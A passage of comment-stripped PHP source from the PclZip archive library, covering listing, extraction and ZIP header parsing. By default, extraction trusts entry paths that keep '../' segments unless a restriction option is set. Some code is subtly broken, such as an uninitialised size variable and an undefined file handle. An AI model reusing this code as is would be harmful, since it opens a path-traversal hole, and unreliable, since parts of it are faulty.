    fputs($this->zip_fd, $v_binary_data, 22);
    if (strlen($p_comment) != 0) { fputs($this->zip_fd, $p_comment, strlen($p_comment)); }
    return $v_result;
  }
  function privList(&$p_list) {
    $v_result=1;
    $this->privDisableMagicQuotes();
    if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0) {
      $this->privSwapBackMagicQuotes();
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');
      return PclZip::errorCode();
    }
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1) {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_central_dir['offset'])) {
      $this->privSwapBackMagicQuotes();
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');
      return PclZip::errorCode();
    }
    for ($i=0; $i<$v_central_dir['entries']; $i++) {
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1) {
        $this->privSwapBackMagicQuotes();
        return $v_result;
      }
      $v_header['index'] = $i;
      $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
      unset($v_header);
    }
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }
  function privConvertHeader2FileInfo($p_header, &$p_info) {
    $v_result=1;
    $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
    $p_info['filename'] = $v_temp_path;
    $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
    $p_info['stored_filename'] = $v_temp_path;
    $p_info['size'] = $p_header['size'];
    $p_info['compressed_size'] = $p_header['compressed_size'];
    $p_info['mtime'] = $p_header['mtime'];
    $p_info['comment'] = $p_header['comment'];
    $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
    $p_info['index'] = $p_header['index'];
    $p_info['status'] = $p_header['status'];
    $p_info['crc'] = $p_header['crc'];
    return $v_result;
  }
  function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options) {
    $v_result=1;
    $this->privDisableMagicQuotes();
    if (($p_path == "") || ((substr($p_path, 0, 1) != "/") && (substr($p_path, 0, 3) != "../") && (substr($p_path,1,2)!=":/")))
      $p_path = "./".$p_path;
    if (($p_path != "./") && ($p_path != "/")) {
      while (substr($p_path, -1) == "/") {
        $p_path = substr($p_path, 0, strlen($p_path)-1);
      }
    }
    if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/')) {
      $p_remove_path .= '/';
    }
    $p_remove_path_size = strlen($p_remove_path);
    if (($v_result = $this->privOpenFd('rb')) != 1) {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1) {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_pos_entry = $v_central_dir['offset'];
    $j_start = 0;
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++) {
      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_pos_entry)) {
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');
        return PclZip::errorCode();
      }
      $v_header = array();
      if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1) {
        $this->privCloseFd();
        $this->privSwapBackMagicQuotes();
        return $v_result;
      }
      $v_header['index'] = $i;
      $v_pos_entry = ftell($this->zip_fd);
      $v_extract = false;
      if ((isset($p_options[PCLZIP_OPT_BY_NAME])) && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {
          for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {
              if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {
                  if ((strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                      $v_extract = true;
                  }
              }
              elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                  $v_extract = true;
              }
          }
      } else if ((isset($p_options[PCLZIP_OPT_BY_PREG])) && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {
          if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
              $v_extract = true;
          }
      } else if ((isset($p_options[PCLZIP_OPT_BY_INDEX])) && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
          for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {
              if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                  $v_extract = true;
              }
              if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                  $j_start = $j+1;
              }
              if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                  break;
              }
          }
      } else {
          $v_extract = true;
      }
	  if (($v_extract) && (($v_header['compression'] != 8) && ($v_header['compression'] != 0))) {
          $v_header['status'] = 'unsupported_compression';
          if ((isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              $this->privSwapBackMagicQuotes();
              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION, "Filename '".$v_header['stored_filename']."' is compressed by an unsupported compression method (".$v_header['compression'].") ");
              return PclZip::errorCode();
		  }
	  }
	  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
          $v_header['status'] = 'unsupported_encryption';
          if ((isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
              $this->privSwapBackMagicQuotes();
              PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, "Unsupported encryption for  filename '".$v_header['stored_filename'] ."'");
              return PclZip::errorCode();
		  }
    }
      if (($v_extract) && ($v_header['status'] != 'ok')) {
          $v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++]);
          if ($v_result != 1) {
              $this->privCloseFd();
              $this->privSwapBackMagicQuotes();
              return $v_result;
          }
          $v_extract = false;
      }
      if ($v_extract) {
        @rewind($this->zip_fd);
        if (@fseek($this->zip_fd, $v_header['offset'])) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');
          return PclZip::errorCode();
        }
        if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {
          $v_string = '';
          $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result1;
          }
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
          }
          $p_file_list[$v_nb_extracted]['content'] = $v_string;
          $v_nb_extracted++;
          if ($v_result1 == 2) { break; }
        } elseif ((isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
          $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result1;
          }
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
          }
          if ($v_result1 == 2) { break; }
        } else {
          $v_result1 = $this->privExtractFile($v_header, $p_path, $p_remove_path, $p_remove_all_path, $p_options);
          if ($v_result1 < 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result1;
          }
          if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
          }
          if ($v_result1 == 2) { break; }
        }
      }
    }
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }
  function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options) {
    $v_result=1;
    if (($v_result = $this->privReadFileHeader($v_header)) != 1) { return $v_result; }
    if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {}
    if ($p_remove_all_path == true) {
        if (($p_entry['external']&0x00000010)==0x00000010) {
            $p_entry['status'] = "filtered";
            return $v_result;
        }
        $p_entry['filename'] = basename($p_entry['filename']);
    }
    else if ($p_remove_path != "") {
      if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2) {
        $p_entry['status'] = "filtered";
        return $v_result;
      }
      $p_remove_path_size = strlen($p_remove_path);
      if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path) {
        $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);
      }
    }
    if ($p_path != '') { $p_entry['filename'] = $p_path."/".$p_entry['filename']; }
    if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
      $v_inclusion = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION], $p_entry['filename']);
      if ($v_inclusion == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION, "Filename '".$p_entry['filename']."' is outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");
        return PclZip::errorCode();
      }
    }
    if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
      $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
      if ($v_result == 0) {
        $p_entry['status'] = "skipped";
        $v_result = 1;
      }
      if ($v_result == 2) {
        $p_entry['status'] = "aborted";
      	$v_result = PCLZIP_ERR_USER_ABORTED;
      }
      $p_entry['filename'] = $v_local_header['filename'];
    }
    if ($p_entry['status'] == 'ok') {
      if (file_exists($p_entry['filename'])) {
        if (is_dir($p_entry['filename'])) {
          $p_entry['status'] = "already_a_directory";
          if ((isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY, "Filename '".$p_entry['filename']."' is already used by an existing directory");
            return PclZip::errorCode();
		    }
        } else if (!is_writeable($p_entry['filename'])) {
          $p_entry['status'] = "write_protected";
          if ((isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
            PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, "Filename '".$p_entry['filename']."' exists and is write protected");
            return PclZip::errorCode();
		    }
        }
        else if (filemtime($p_entry['filename']) > $p_entry['mtime']) {
          if ((isset($p_options[PCLZIP_OPT_REPLACE_NEWER])) && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
		  } else {
            $p_entry['status'] = "newer_exist";
            if ((isset($p_options[PCLZIP_OPT_STOP_ON_ERROR])) && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {
                PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, "Newer version of '".$p_entry['filename']."' exists and option PCLZIP_OPT_REPLACE_NEWER is not selected");
                return PclZip::errorCode();
		      }
		    }
        }
      } else {
        if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
          $v_dir_to_check = $p_entry['filename'];
        else if (!strstr($p_entry['filename'], "/"))
          $v_dir_to_check = "";
        else
          $v_dir_to_check = dirname($p_entry['filename']);
        if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {
          $p_entry['status'] = "path_creation_fail";
          $v_result = 1;
        }
      }
    }
    if ($p_entry['status'] == 'ok') {
      if (!(($p_entry['external']&0x00000010)==0x00000010)) {
        if ($p_entry['compression'] == 0) {
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
            $p_entry['status'] = "write_error";
            return $v_result;
          }
          $v_size = $p_entry['compressed_size'];
          while ($v_size != 0) {
            $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
            $v_buffer = @fread($this->zip_fd, $v_read_size);
            @fwrite($v_dest_file, $v_buffer, $v_read_size);            
            $v_size -= $v_read_size;
          }
          fclose($v_dest_file);
          touch($p_entry['filename'], $p_entry['mtime']);
        } else {
          if (($p_entry['flag'] & 1) == 1) {
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
            return PclZip::errorCode();
          }
          if ((!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON]) || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]) && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
            $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
            if ($v_result < PCLZIP_ERR_NO_ERROR) { return $v_result; }
          } else {
            $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
            $v_file_content = @gzinflate($v_buffer);
            unset($v_buffer);
            if ($v_file_content === FALSE) {
              $p_entry['status'] = "error";
              return $v_result;
            }
            if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
              $p_entry['status'] = "write_error";
              return $v_result;
            }
            @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
            unset($v_file_content);
            @fclose($v_dest_file);
          }
          @touch($p_entry['filename'], $p_entry['mtime']);
        }
        if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {
          @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
        }
      }
    }
  	if ($p_entry['status'] == "aborted") {
        $p_entry['status'] = "skipped";
  	} elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
      $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);
      if ($v_result == 2) { $v_result = PCLZIP_ERR_USER_ABORTED; }
    }
    return $v_result;
  }
  function privExtractFileUsingTempFile(&$p_entry, &$p_options) {
    $v_result=1;
    $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
    if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
      fclose($v_file);
      PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
      return PclZip::errorCode();
    }
    $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
    @fwrite($v_dest_file, $v_binary_data, 10);
    $v_size = $p_entry['compressed_size'];
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($this->zip_fd, $v_read_size);
      @fwrite($v_dest_file, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
    @fwrite($v_dest_file, $v_binary_data, 8);
    @fclose($v_dest_file);
    if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
      $p_entry['status'] = "write_error";
      return $v_result;
    }
    if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
      @fclose($v_dest_file);
      $p_entry['status'] = "read_error";
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
      return PclZip::errorCode();
    }
    $v_size = $p_entry['size'];
    while ($v_size != 0) {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($v_src_file, $v_read_size);
      @fwrite($v_dest_file, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }
    @fclose($v_dest_file);
    @gzclose($v_src_file);
    @unlink($v_gzip_temp_name);
    return $v_result;
  }
  function privReadFileHeader(&$p_header) {
    $v_result=1;
    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = unpack('Vid', $v_binary_data);
    if ($v_data['id'] != 0x04034b50) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');
      return PclZip::errorCode();
    }
    $v_binary_data = fread($this->zip_fd, 26);
    if (strlen($v_binary_data) != 26) {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));
      return PclZip::errorCode();
    }
    $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);
    $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);
    if ($v_data['extra_len'] != 0) {
      $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
    } else {
      $p_header['extra'] = '';
    }
    $p_header['version_extracted'] = $v_data['version'];
    $p_header['compression'] = $v_data['compression'];
    $p_header['size'] = $v_data['size'];
    $p_header['compressed_size'] = $v_data['compressed_size'];
    $p_header['crc'] = $v_data['crc'];
    $p_header['flag'] = $v_data['flag'];
    $p_header['filename_len'] = $v_data['filename_len'];
    $p_header['mdate'] = $v_data['mdate'];
    $p_header['mtime'] = $v_data['mtime'];
    if ($p_header['mdate'] && $p_header['mtime']) {
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;
      $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);
    } else {
      $p_header['mtime'] = time();
    }
    $p_header['stored_filename'] = $p_header['filename'];
    $p_header['status'] = "ok";
    return $v_result;
  }
  function privReadCentralFileHeader(&$p_header) {
    $v_result=1;
    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = unpack('Vid', $v_binary_data);
    if ($v_data['id'] != 0x02014b50) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');
      return PclZip::errorCode();
    }
    $v_binary_data = fread($this->zip_fd, 42);
    if (strlen($v_binary_data) != 42) {
      $p_header['filename'] = "";
      $p_header['status'] = "invalid_header";
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));
      return PclZip::errorCode();
    }
    $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);
    if ($p_header['filename_len'] != 0)
      $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
    else
      $p_header['filename'] = '';
    if ($p_header['extra_len'] != 0)
      $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
    else
      $p_header['extra'] = '';
    if ($p_header['comment_len'] != 0)
      $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
    else
      $p_header['comment'] = '';
    if (1) {
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
      $v_day = $p_header['mdate'] & 0x001F;
      $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);
    } else {
      $p_header['mtime'] = time();
    }
    $p_header['stored_filename'] = $p_header['filename'];
    $p_header['status'] = 'ok';
    if (substr($p_header['filename'], -1) == '/') {
      $p_header['external'] = 0x00000010;
    }
    return $v_result;
  }
  function privCheckFileHeaders(&$p_local_header, &$p_central_header) {
    $v_result=1;
  	if ($p_local_header['filename'] != $p_central_header['filename']) {}
  	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {}
  	if ($p_local_header['flag'] != $p_central_header['flag']) {}
  	if ($p_local_header['compression'] != $p_central_header['compression']) {}
  	if ($p_local_header['mtime'] != $p_central_header['mtime']) {}
  	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {}
  	if (($p_local_header['flag'] & 8) == 8) {
          $p_local_header['size'] = $p_central_header['size'];
          $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
          $p_local_header['crc'] = $p_central_header['crc'];
  	}
    return $v_result;
  }
  function privReadEndCentralDir(&$p_central_dir) {
    $v_result=1;
    $v_size = filesize($this->zipname);
    @fseek($this->zip_fd, $v_size);
    if (@ftell($this->zip_fd) != $v_size) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');
      return PclZip::errorCode();
    }
    $v_found = 0;
    if ($v_size > 26) {
      @fseek($this->zip_fd, $v_size-22);
      if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22)) {
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');
        return PclZip::errorCode();
      }
      $v_binary_data = @fread($this->zip_fd, 4);
      $v_data = @unpack('Vid', $v_binary_data);
      if ($v_data['id'] == 0x06054b50) { $v_found = 1; }
      $v_pos = ftell($this->zip_fd);
    }
    if (!$v_found) {
      if ($v_maximum_size > $v_size) $v_maximum_size = $v_size;
      @fseek($this->zip_fd, $v_size-$v_maximum_size);
      if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size)) {
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');
        return PclZip::errorCode();
      }
      $v_pos = ftell($this->zip_fd);
      $v_bytes = 0x00000000;
      while ($v_pos < $v_size) {
        $v_byte = @fread($this->zip_fd, 1);
        $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 
        if ($v_bytes == 0x504b0506) {
          $v_pos++;
          break;
        }
        $v_pos++;
      }
      if ($v_pos == $v_size) {
        PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");
        return PclZip::errorCode();
      }
    }
    $v_binary_data = fread($this->zip_fd, 18);
    if (strlen($v_binary_data) != 18) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));
      return PclZip::errorCode();
    }
    $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);
    if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {
	  if (0) {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'The central dir is not at the end of the archive. Some trailing bytes exists after the archive.');
      return PclZip::errorCode();
	  }
    }
    if ($v_data['comment_size'] != 0) {
      $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
    } else
      $p_central_dir['comment'] = '';
    $p_central_dir['entries'] = $v_data['entries'];
    $p_central_dir['disk_entries'] = $v_data['disk_entries'];
    $p_central_dir['offset'] = $v_data['offset'];
    $p_central_dir['size'] = $v_data['size'];
    $p_central_dir['disk'] = $v_data['disk'];
    $p_central_dir['disk_start'] = $v_data['disk_start'];
    return $v_result;
  }
  function privDirCheck($p_dir, $p_is_dir=false) {
    $v_result = 1;
    if (($p_is_dir) && (substr($p_dir, -1)=='/')) { $p_dir = substr($p_dir, 0, strlen($p_dir)-1); }
    if ((is_dir($p_dir)) || ($p_dir == "")) { return 1; }
    $p_parent_dir = dirname($p_dir);
    if ($p_parent_dir != $p_dir) {
      if ($p_parent_dir != "") {
        if (($v_result = $this->privDirCheck($p_parent_dir)) != 1) { return $v_result; }
      }
    }
    if (!@mkdir($p_dir, 0777)) {
      PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");
      return PclZip::errorCode();
    }
    return $v_result;
  }
  function privErrorLog($p_error_code=0, $p_error_string='') {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclError($p_error_code, $p_error_string);
    } else {
      $this->error_code = $p_error_code;
      $this->error_string = $p_error_string;
    }
  }
  function privErrorReset() {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclErrorReset();
    } else {
      $this->error_code = 0;
      $this->error_string = '';
    }
  }
  function privDisableMagicQuotes() {
    $v_result=1;
    if ((!function_exists("get_magic_quotes_runtime")) || (!function_exists("set_magic_quotes_runtime"))) { return $v_result; }
    if ($this->magic_quotes_status != -1) { return $v_result; }
	$this->magic_quotes_status = @get_magic_quotes_runtime();
	if ($this->magic_quotes_status == 1) { @set_magic_quotes_runtime(0); }
    return $v_result;
  }
  function privSwapBackMagicQuotes() {
    $v_result=1;
    if ((!function_exists("get_magic_quotes_runtime")) || (!function_exists("set_magic_quotes_runtime"))) { return $v_result; }
    if ($this->magic_quotes_status != -1) { return $v_result; }
	if ($this->magic_quotes_status == 1) { @set_magic_quotes_runtime($this->magic_quotes_status); }
    return $v_result;
  }
}
function PclZipUtilPathReduction($p_dir) {
    $v_result = "";
    if ($p_dir != "") {
      $v_list = explode("/", $p_dir);
      $v_skip = 0;
      for ($i=sizeof($v_list)-1; $i>=0; $i--) {
        if ($v_list[$i] == ".") {}
        else if ($v_list[$i] == "..") { $v_skip++; }
        else if ($v_list[$i] == "") {
		  if ($i == 0) {
            $v_result = "/".$v_result;
		    if ($v_skip > 0) {
		        $v_result = $p_dir;
                $v_skip = 0;
		    }
		  }
		  else if ($i == (sizeof($v_list)-1)) { $v_result = $v_list[$i]; }
        }
        else {
		  if ($v_skip > 0) {
		    $v_skip--;
		  } else {
            $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
		  }
        }
      }
      if ($v_skip > 0) {
        while ($v_skip > 0) {
            $v_result = '../'.$v_result;
            $v_skip--;
        }
      }
    }
    return $v_result;
}
function PclZipUtilPathInclusion($p_dir, $p_path) {
    $v_result = 1;
    if (($p_dir == '.') || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) { $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1); }
    if (($p_path == '.') || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) { $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1); }
    $v_list_dir = explode("/", $p_dir);
    $v_list_dir_size = sizeof($v_list_dir);
    $v_list_path = explode("/", $p_path);
    $v_list_path_size = sizeof($v_list_path);
    $i = 0;
    $j = 0;
    while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {
      if ($v_list_dir[$i] == '') { $i++; continue; }
      if ($v_list_path[$j] == '') { $j++; continue; }
      if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  { $v_result = 0; }
      $i++;
      $j++;
    }
    if ($v_result) {
      while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
      while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;
      if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) { $v_result = 2; }
      else if ($i < $v_list_dir_size) { $v_result = 0; }
    }
    return $v_result;
}
function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0) {
    $v_result = 1;
    if ($p_mode==0) {
      while ($p_size != 0) {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        $v_buffer = @fread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    } else if ($p_mode==1) {
      while ($p_size != 0) {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        $v_buffer = @gzread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    } else if ($p_mode==2) {
      while ($p_size != 0) {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        $v_buffer = @fread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    } else if ($p_mode==3) {
      while ($p_size != 0) {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
